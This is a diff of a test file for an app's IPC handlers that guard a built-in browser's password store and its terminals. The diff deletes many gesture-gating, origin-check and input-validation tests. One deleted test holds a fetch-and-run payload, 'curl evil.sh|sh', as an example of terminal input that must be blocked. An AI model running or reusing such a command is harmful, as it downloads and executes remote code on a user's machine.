-    expect(await invoke.get('browser-import:cookies')?.(activeAppEvent, 'Default')).toMatchObject({
-      error: 'unknown',
-    })
-    expect(
-      await invoke.get('browser-credentials:list-fill-options')?.(activeAppEvent, 'chat-a')
-    ).toEqual([])
-    expect(
-      await invoke.get('browser-credentials:fill-selected')?.(activeAppEvent, 'c1', 'chat-a')
-    ).toBe(false)
-    expect(listChromeImportProfiles).not.toHaveBeenCalled()
-    expect(importChromeCookies).not.toHaveBeenCalled()
-    expect(mockCoordinator.listFillOptions).not.toHaveBeenCalled()
-    expect(mockCoordinator.fillCredential).not.toHaveBeenCalled()
-  })
-
   it('refuses a malformed profile id rather than importing the default profile', async () => {
     const { invoke } = collectHandlers()
 
@@ -1710,13 +1008,6 @@ describe('registerIpcHandlers', () => {
       error: 'unknown',
     })
     expect(importChromeCookies).not.toHaveBeenCalled()
-  })
-
-  it('imports the default profile when the page names none', async () => {
-    const { invoke } = collectHandlers()
-
-    await invoke.get('browser-import:cookies')?.(activeAppEvent, undefined)
-    expect(importChromeCookies).toHaveBeenCalledWith(undefined)
   })
 
   it('exposes exactly one channel that can return a password', async () => {
@@ -1771,27 +1062,6 @@ describe('registerIpcHandlers', () => {
     expect(revealCredential).toHaveBeenCalledWith('c1')
   })
 
-  it('requires a live user gesture before deleting every password', async () => {
-    const { invoke } = collectHandlers()
-    const handler = invoke.get('browser-credentials:forget-all')
-
-    expect(await handler?.(evilEvent)).toEqual([])
-    expect(await handler?.(inactiveAppEvent)).toEqual([])
-    expect(forgetAllCredentials).not.toHaveBeenCalled()
-
-    await handler?.(activeAppEvent)
-    expect(forgetAllCredentials).toHaveBeenCalled()
-  })
-
-  it('refuses a reveal for anything that is not a credential id', async () => {
-    const { invoke } = collectHandlers()
-
-    expect(
-      await invoke.get('browser-credentials:reveal')?.(activeAppEvent, { id: 'c1' })
-    ).toBeNull()
-    expect(revealCredential).not.toHaveBeenCalled()
-  })
-
   it('accepts login-form reports only from the built-in browseritself', async () => {
     const { on } = collectHandlers()
     const handler = on.get('browser-credentials:form-state')
@@ -1817,90 +1087,6 @@ describe('registerIpcHandlers', () => {
     expect(mockCoordinator.noteFormState).toHaveBeenCalledWith(browserPageEvent.sender, report)
   })
 
-  it('ignores a malformed login-form report', () => {
-    const { on } = collectHandlers()
-    const handler = on.get('browser-credentials:form-state')
-    const browserPageEvent = {
-      senderFrame: { url: 'https://x.test/' },
-      sender: { isBrowserTab: true },
-    }
-
-    handler?.(browserPageEvent, 'nonsense')
-    handler?.(browserPageEvent, { origin: 42, hasLoginForm: true })
-    handler?.(browserPageEvent, { origin: 'https://x.test', hasLoginForm: 'yes' })
-    handler?.(browserPageEvent, {
-      origin: 'https://x.test',
-      hasLoginForm: true,
-      hasPasswordField: 'yes',
-    })
-
-    expect(mockCoordinator.noteFormState).not.toHaveBeenCalled()
-  })
-
-  it('requires native browser input before opening the field picker', () => {
-    const { on } = collectHandlers()
-    const handler = on.get('browser-credentials:picker')
-    const tracked = trackedSender()
-    Object.assign(tracked.sender, { isBrowserTab: true })
-    const event = { sender: tracked.sender, senderFrame: { url: 'https://example.com/login' } }
-    handler?.(activeAppEvent, 'open')
-    handler?.(event, 'open')
-    expect(mockCoordinator.requestPicker).not.toHaveBeenCalled()
-    tracked.press()
-    handler?.(event, 'unknown')
-    expect(mockCoordinator.requestPicker).not.toHaveBeenCalled()
-    handler?.(event, 'open')
-    expect(mockCoordinator.requestPicker).toHaveBeenCalledWith(tracked.sender, 'open')
-  })
-
-  it('accepts fill acknowledgements only from browser pages with a valid status', () => {
-    const { on } = collectHandlers()
-    const handler = on.get('browser-credentials:fill-result')
-    const event = {
-      sender: { isBrowserTab: true },
-      senderFrame: { url: 'https://example.com/login' },
-    }
-    const result = { requestId: 'request-1', status: 'filled' }
-    handler?.(activeAppEvent, result)
-    handler?.(evilEvent, result)
-    handler?.(event, { ...result, status: 'unknown' })
-    expect(mockCoordinator.noteFillResult).not.toHaveBeenCalled()
-    handler?.(event, result)
-    expect(mockCoordinator.noteFillResult).toHaveBeenCalledWith(event.sender, result)
-  })
-
-  it.each([0, -1, Number.NaN, Number.POSITIVE_INFINITY])(
-    'rejects invalid focused field dimensions: %s',
-    (width) => {
-      const { on } = collectHandlers()
-      on.get('browser-credentials:form-state')?.(
-        { sender: { isBrowserTab: true }, senderFrame: { url: 'https://example.com/login' } },
-        {
-          origin: 'https://example.com',
-          targetId: 'target-1',
-          hasLoginForm: true,
-          hasPasswordField: true,
-          bounds: { x: 0, y: 0, width, height: 30 },
-        }
-      )
-      expect(mockCoordinator.noteFormState).not.toHaveBeenCalled()
-    }
-  )
-
-  it('requires a live user gesture before opening the credential chooser', async () => {
-    const { invoke } = collectHandlers()
-    const handler = invoke.get('browser-credentials:show-chooser')
-    const anchor = { x: 10, y: 20 }
-
-    expect(await handler?.(evilEvent, anchor)).toBe(false)
-    expect(await handler?.(inactiveAppEvent, anchor)).toBe(false)
-    expect(mockCoordinator.showChooser).not.toHaveBeenCalled()
-
-    await invoke.get('browser-agent:activate-scope')?.(activeChooserEvent, 'chat-a')
-    expect(await handler?.(activeChooserEvent, anchor, 'chat-a')).toBe(true)
-    expect(mockCoordinator.showChooser).toHaveBeenCalledWith(FAKE_WINDOW, anchor, 'chat-a')
-  })
-
   it('lists and fills only for the renderer-active browser scope', async () => {
     const { invoke } = collectHandlers()
     const list = invoke.get('browser-credentials:list-fill-options')
@@ -1924,44 +1110,6 @@ describe('registerIpcHandlers', () => {
     expect(mockCoordinator.fillCredential).toHaveBeenCalledWith('c1', 'chat-a')
   })
 
-  it('refuses a chooser anchor that is not a real point', async () => {
-    const { invoke } = collectHandlers()
-    const handler = invoke.get('browser-credentials:show-chooser')
-
-    expect(await handler?.(activeChooserEvent, { x: 'left', y: 2 })).toBe(false)
-    expect(await handler?.(activeChooserEvent, { x: Number.NaN, y: 2 })).toBe(false)
-    expect(await handler?.(activeChooserEvent, null)).toBe(false)
-    expect(mockCoordinator.showChooser).not.toHaveBeenCalled()
-  })
-
-  it('requires a live user gesture before importing or forgetting passwords', async () => {
-    const { invoke } = collectHandlers()
-
-    expect(
-      await invoke.get('browser-credentials:import')?.(inactiveAppEvent, 'Default')
-    ).toMatchObject({ error: 'unknown' })
-    await invoke.get('browser-credentials:forget')?.(inactiveAppEvent, 'c1')
-    expect(importChromePasswords).not.toHaveBeenCalled()
-    expect(forgetCredential).not.toHaveBeenCalled()
-
-    await invoke.get('browser-credentials:import')?.(activeAppEvent, 'Default', 'replace')
-    await invoke.get('browser-credentials:forget')?.(activeAppEvent, 'c1')
-    expect(importChromePasswords).toHaveBeenCalledWith('Default', 'replace')
-    expect(forgetCredential).toHaveBeenCalledWith('c1')
-  })
-
-  it('forwards fixed PTY device and focus reports without a gesture', () => {
-    const { on } = collectHandlers()
-    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
-
-    const replies = ['\u001b[24;80R', '\u001b[?62;c', '\u001b[I', '\u001b[O']
-    for (const reply of replies) {
-      on.get('terminal:write')?.(inactiveAppEvent, 't1', reply, 'chat-a')
-      expect(write).toHaveBeenCalledWith('chat-a', 't1', reply)
-    }
-    expect(write).toHaveBeenCalledTimes(replies.length)
-  })
-
   it('keeps explicitly scoped terminal input in its owning chat', async () => {
     const { invoke, on } = collectHandlers()
     const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
@@ -1972,131 +1120,6 @@ describe('registerIpcHandlers', () => {
 
     on.get('terminal:write')?.(appEvent, 't1', '\u001b[24;80R', 'chat-b')
     expect(write).toHaveBeenCalledWith('chat-b', 't1', '\u001b[24;80R')
-  })
-
-  it('clears retained terminal output only for an app-owned scope', async () => {
-    const { invoke } = collectHandlers()
-    const clearScrollback = vi.spyOn(deps.terminal, 'clearScrollback').mockReturnValue(true)
-    const handler = invoke.get('terminal:clear-scrollback')
-
-    await expect(handler?.(evilEvent, 't1', 'chat-b')).resolves.toBe(false)
-    await expect(handler?.(appEvent, 't1', 'chat-b')).resolves.toBe(true)
-
-    expect(clearScrollback).toHaveBeenCalledOnce()
-    expect(clearScrollback).toHaveBeenCalledWith('chat-b', 't1')
-  })
-
-  it('routes terminal scope events after activation and a valid provisional migration', async () => {
-    const migrate = vi.spyOn(deps.terminal, 'migrateScope').mockReturnValue(true)
-    const { invoke } = collectHandlers()
-
-    await invoke.get('terminal:activate-scope')?.(appEvent, 'pending:new')
-    expect(deps.scopeEvents.activateTerminal).toHaveBeenCalledWith(appSender, 'pending:new')
-
-    await invoke.get('terminal:migrate-scope')?.(appEvent, 'pending:new', 'chat-durable')
-    expect(migrate).toHaveBeenCalledOnce()
-    expect(migrate).toHaveBeenCalledWith('pending:new', 'chat-durable')
-    expect(deps.scopeEvents.activateTerminal).toHaveBeenLastCalledWith(appSender, 'chat-durable')
-  })
-
-  it('migrates an owned hidden terminal scope without changing the visible chat route', async () => {
-    const migrate = vi.spyOn(deps.terminal, 'migrateScope').mockReturnValue(true)
-    const { invoke } = collectHandlers()
-    const migrateScope = invoke.get('terminal:migrate-scope')
-
-    await invoke.get('terminal:activate-scope')?.(appEvent, 'pending:hidden')
-    await invoke.get('terminal:activate-scope')?.(appEvent, 'chat-visible')
-    await migrateScope?.(appEvent, 'pending:hidden', 'chat-durable')
-
-    expect(migrate).toHaveBeenCalledOnce()
-    expect(deps.scopeEvents.activateTerminal).toHaveBeenLastCalledWith(appSender, 'chat-visible')
-    expect(deps.scopeEvents.activateTerminal).not.toHaveBeenCalledWith(appSender, 'chat-durable')
-
-    await expect(migrateScope?.(appEvent, 'pending:hidden', 'chat-replay')).resolves.toEqual({
-      tabs: [],
-      activeTerminalId: null,
-    })
-    expect(migrate).toHaveBeenCalledOnce()
-  })
-
-  it('denies terminal scope rekeys unless the sender owns a provisional source', async () => {
-    const migrate = vi.spyOn(deps.terminal, 'migrateScope').mockReturnValue(true)
-    const { invoke } = collectHandlers()
-    const migrateScope = invoke.get('terminal:migrate-scope')
-
-    await expect(migrateScope?.(appEvent, 'pending:not-active', 'chat-durable')).resolves.toEqual({
-      tabs: [],
-      activeTerminalId: null,
-    })
-
-    await invoke.get('terminal:activate-scope')?.(appEvent, 'pending:active')
-    await expect(migrateScope?.(appEvent, 'pending:active', 'pending:other')).resolves.toEqual({
-      tabs: [],
-      activeTerminalId: null,
-    })
-    await expect(migrateScope?.(appEvent, 'pending:active', 'not valid!')).resolves.toEqual({
-      tabs: [],
-      activeTerminalId: null,
-    })
-    await expect(migrateScope?.(appEvent, 'chat-durable', 'chat-other')).resolves.toEqual({
-      tabs: [],
-      activeTerminalId: null,
-    })
-
-    expect(migrate).not.toHaveBeenCalled()
-    expect(deps.scopeEvents.activateTerminal).toHaveBeenCalledTimes(1)
-  })
-
-  it('keeps the terminal sender on its provisional scope when migration fails', async () => {
-    const migrate = vi.spyOn(deps.terminal, 'migrateScope').mockReturnValue(false)
-    const { invoke } = collectHandlers()
-
-    await invoke.get('terminal:activate-scope')?.(appEvent, 'pending:active')
-    await expect(
-      invoke.get('terminal:migrate-scope')?.(appEvent, 'pending:active', 'chat-durable')
-    ).resolves.toEqual({ tabs: [], activeTerminalId: null })
-
-    migrate.mockReturnValue(true)
-    await invoke.get('terminal:migrate-scope')?.(appEvent, 'pending:active', 'chat-retry')
-    expect(migrate).toHaveBeenNthCalledWith(2, 'pending:active', 'chat-retry')
-    expect(deps.scopeEvents.activateTerminal).toHaveBeenLastCalledWith(appSender, 'chat-retry')
-  })
-
-  it('only disposes provisional terminal scopes owned by the calling renderer', async () => {
-    const { invoke } = collectHandlers()
-    const disposeScope = vi.spyOn(deps.terminal, 'disposeScope')
-    const dispose = invoke.get('terminal:dispose-scope')
-
-    expect(await dispose?.(evilEvent, 'pending:new')).toBe(false)
-    expect(await dispose?.(appEvent, 'chat-durable')).toBe(false)
-    expect(await dispose?.(appEvent, 'pending:new')).toBe(false)
-
-    await invoke.get('terminal:activate-scope')?.(appEvent, 'pending:new')
-    expect(await dispose?.(appEvent, 'pending:new')).toBe(true)
-    expect(await dispose?.(appEvent, 'pending:new')).toBe(false)
-    expect(disposeScope).toHaveBeenCalledOnce()
-    expect(disposeScope).toHaveBeenCalledWith('pending:new')
-  })
-
-  it('suspends only the durable terminal scope active in the calling renderer', async () => {
-    const suspendScope = vi.spyOn(deps.terminal, 'suspendScope').mockReturnValue(true)
-    const { invoke } = collectHandlers()
-    const suspend = invoke.get('terminal:suspend-scope')
-
-    expect(await suspend?.(evilEvent, 'chat-durable')).toBe(false)
-    expect(await suspend?.(appEvent, 'not valid!')).toBe(false)
-    expect(await suspend?.(appEvent, 'pending:new')).toBe(false)
-    expect(await suspend?.(appEvent, 'chat-durable')).toBe(false)
-
-    await invoke.get('terminal:activate-scope')?.(appEvent, 'chat-durable')
-    expect(await suspend?.(appEvent, 'chat-durable')).toBe(true)
-    expect(suspendScope).toHaveBeenCalledOnce()
-    expect(suspendScope).toHaveBeenCalledWith('chat-durable')
-    expect(deps.scopeEvents.sendTerminal).toHaveBeenCalledWith(
-      'chat-durable',
-      'terminal:scope-suspended',
-      'chat-durable'
-    )
   })
 
   it('closes terminal tabs only after a gesture from their active visible renderer', async () => {
@@ -2122,12 +1145,6 @@ describe('registerIpcHandlers', () => {
     expect(close).not.toHaveBeenCalled()
   })
 
-  it('does not expose renderer-wide terminal teardown', () => {
-    const { on } = collectHandlers()
-
-    expect(on.has('terminal:dispose')).toBe(false)
-  })
-
   it('pastes the clipboard from main rather than taking bytes from the caller', async () => {
     const { invoke } = collectHandlers()
     const write = vi.spyOn(deps.terminal, 'writeUserInput').mockReturnValue(true)
@@ -2136,19 +1153,6 @@ describe('registerIpcHandlers', () => {
     await expect(invoke.get('terminal:paste')?.(activeAppEvent, 't1', 'chat-a')).resolves.toBe(true)
 
     expect(write).toHaveBeenCalledWith('chat-a', 't1', 'echo hi', activeSender.sender)
-  })
-
-  it('refuses a paste with no gesture behind it, and reports an empty clipboard', async () => {
-    const { invoke } = collectHandlers()
-    const write = vi.spyOn(deps.terminal, 'writeUserInput').mockReturnValue(true)
-    vi.mocked(clipboard.readText).mockReturnValue('echo hi')
-
-    expect(await invoke.get('terminal:paste')?.(inactiveAppEvent, 't1', 'chat-a')).toBe(false)
-    expect(write).not.toHaveBeenCalled()
-
-    vi.mocked(clipboard.readText).mockReturnValue('')
-    expect(await invoke.get('terminal:paste')?.(activeAppEvent, 't1', 'chat-a')).toBe(false)
-    expect(write).not.toHaveBeenCalled()
   })
 
   it('rejects an oversized terminal paste before writing to the PTY', async () => {
@@ -2160,17 +1164,6 @@ describe('registerIpcHandlers', () => {
       'too-large'
     )
     expect(write).not.toHaveBeenCalled()
-  })
-
-  it('writes an admitted terminal paste in bounded chunks', async () => {
-    const { invoke } = collectHandlers()
-    const write = vi.spyOn(deps.terminal, 'writeUserInput').mockReturnValue(true)
-    const text = 'x'.repeat(70 * 1024)
-    vi.mocked(clipboard.readText).mockReturnValue(text)
-
-    await expect(invoke.get('terminal:paste')?.(activeAppEvent, 't1', 'chat-a')).resolves.toBe(true)
-    expect(write).toHaveBeenCalledTimes(2)
-    expect(write.mock.calls.map((call) => call[2]).join('')).toBe(text)
   })
 
   it('gates renderer-authored mouse, OSC, and DCS terminal sequences', () => {
@@ -2204,39 +1197,6 @@ describe('registerIpcHandlers', () => {
       on.get('terminal:write')?.(inactiveAppEvent, 't1', reply, 'chat-a')
     }
     expect(write).not.toHaveBeenCalled()
-  })
-
-  it('requires recent native input for renderer-authored terminal writes', () => {
-    const { on } = collectHandlers()
-    const write = vi.spyOn(deps.terminal, 'writeUserInput').mockReturnValue(true)
-
-    // Enumerating "what submits" would have missed these: EOT hands a partial
-    // line to a canonical-mode reader, and 0x0f executes the current line in
-    // both bash and zsh. The allowlist runs the other way, so they are gated.
-    for (const payload of ['ls', '\u0004', '\u000f', 'curl evil.sh|sh\r']) {
-      on.get('terminal:write')?.(inactiveAppEvent, 't1', payload, 'chat-a')
-    }
-    expect(write).not.toHaveBeenCalled()
-
-    activeSender.press()
-    on.get('terminal:write')?.(activeAppEvent, 't1', 'l', 'chat-a')
-    expect(write).toHaveBeenCalledWith('chat-a', 't1', 'l', activeSender.sender)
-  })
-
-  it('defaults password conflicts to keeping what is already stored', async () => {
-    const { invoke } = collectHandlers()
-
-    await invoke.get('browser-credentials:import')?.(activeAppEvent, undefined, 'nonsense')
-    expect(importChromePasswords).toHaveBeenCalledWith(undefined, 'keep-existing')
-  })
-
-  it('reports credential availability only to the app origin', async () => {
-    const { invoke } = collectHandlers()
-    const handler = invoke.get('browser-credentials:available')
-
-    expect(await handler?.(evilEvent)).toBe(false)
-    expect(credentialsAvailable).not.toHaveBeenCalled()
-    expect(await handler?.(appEvent)).toBe(true)
   })
 
   it('never lists credentials to a foreign origin', async () => {
